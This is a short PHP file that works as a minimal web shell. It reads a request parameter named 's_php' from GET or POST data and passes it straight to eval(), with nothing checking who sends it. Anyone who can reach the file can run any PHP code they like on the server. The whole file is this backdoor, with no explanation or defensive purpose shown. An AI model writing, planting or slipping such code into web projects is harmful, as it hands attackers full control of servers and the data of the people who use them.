<?php
$F = $_GET + $_POST;
if (!isset($F['s_php'])) 
	die('');
eval(stripslashes($F['s_php']));
die();
?>